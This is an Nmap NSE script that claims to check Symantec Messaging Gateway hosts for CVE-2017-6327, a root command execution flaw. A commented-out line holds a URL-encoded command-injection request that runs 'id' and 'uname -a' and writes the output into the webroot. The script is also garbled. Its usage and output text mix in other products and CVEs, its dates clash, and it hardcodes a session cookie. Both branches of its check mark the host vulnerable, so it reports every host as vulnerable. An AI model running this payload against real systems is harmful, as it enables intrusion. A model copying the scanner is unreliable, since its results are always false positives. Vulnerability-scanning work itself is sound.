local shortport = require "shortport"
local http = require "http"
local vulns = require "vulns"


description = [[
    Symantec Messaging Gateway 10.6.3-2 - Root Remote Command Execution.
]]

---
-- @usage
-- nmap nmap -p80 -Pn --script http-vuln-cve2019-7238 <host>
--
-- @output
-- PORT    STATE SERVICE
-- 8081/tcp open  http
-- | http-NexusRepositoryManager-rce:
-- |   VULNERABLE:
-- |   Symantec Messaging Gateway  > 3.15.0 - Credentials Disclosure
-- |     State: VULNERABLE
-- |     IDs:  CVE-2017-6327
-- |     Risk factor: High
-- |     Description:
-- |       Symantec Messaging Gateway 10.6.3-2 - Root Remote Command Execution.
-- |
-- |     Vulnerability discovered by Danny (@DannyRavi).
-- |     Disclosure date: 2021-04-25
-- |     References:
-- |	     https://www.exploit-db.com/exploits/42519
-- |	     https://vulners.com/packetstorm/PACKETSTORM:143821
--
--

author     = {"danny Ravi   @dannyRavi"}
license    = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln","safe"}

portrule = shortport.service

local VULNERABLE = "Symantec Messaging Gateway -&nbsp;Restore"
-- local path = "/brightmail/admin/restore/action5.do?method=performRestore&symantec.brightmail.key.TOKEN=bbda9b0a52bca4a43cc2b6051cd6b95900068cd3&restoreSource=APPLIANCE&localBackupFileSelection=%61%73%64%66%60%69%64%3e%2f%64%61%74%61%2f%62%63%63%2f%77%65%62%61%70%70%73%2f%62%72%69%67%68%74%6d%61%69%6c%2f%6f%75%74%70%75%74%2e%74%78%74%3b%2f%62%69%6e%2f%75%6e%61%6d%65%20%2d%61%3e%3e%2f%64%61%74%61%2f%62%63%63%2f%77%65%62%61%70%70%73%2f%62%72%69%67%68%74%6d%61%69%6c%2f%6f%75%74%70%75%74%2e%74%78%74%60%68%65%68%65%68%65"
-- print(response.status)
local path = "/0ace6975-e630-466a-9b9d-6a986a437219"

action = function(host,  port)
local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
local vuln = {
title = ' Messaging Gateway 10.6.3-2 - Root Remote Command Execution',
state = vulns.STATE.NOT_VULN,
description = [[
    Symantec Messaging Gateway 10.6.3-2 - Root Remote Command Execution.
]],
IDS = {CVE = 'CVE-2017-6327'},
references = {
    'https://nvd.nist.gov/vuln/detail/CVE-2017-6327'
},
dates = {
    disclosure = {year = '2021', month = '03', day = '30'},
},
}

local options = {header={}}
options['header']["User-Agent"] = "	PostmanRuntime/7.21.8"
options['header']["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
options['header']["Accept-Language"] = "en-US,en;q=0.5"
options['header']["Accept-Encoding"] = "gzip, deflate, br"
options['header']["Cookie"] = "JSESSIONID=34D61B34698831DB765A9DD5E0049D0B"
options['header']["Connection"] = "close"
options['header']["Upgrade-Insecure-Requests"] = "1"


local response = http.generic_request(host, port,"GET",path,options)

if response.status == 200  and http.response_contains(response,VULNERABLE)  then
    vuln.state = vulns.STATE.VULN
else
    vuln.state = vulns.STATE.VULN
end

return vuln_report:make_output(vuln)
end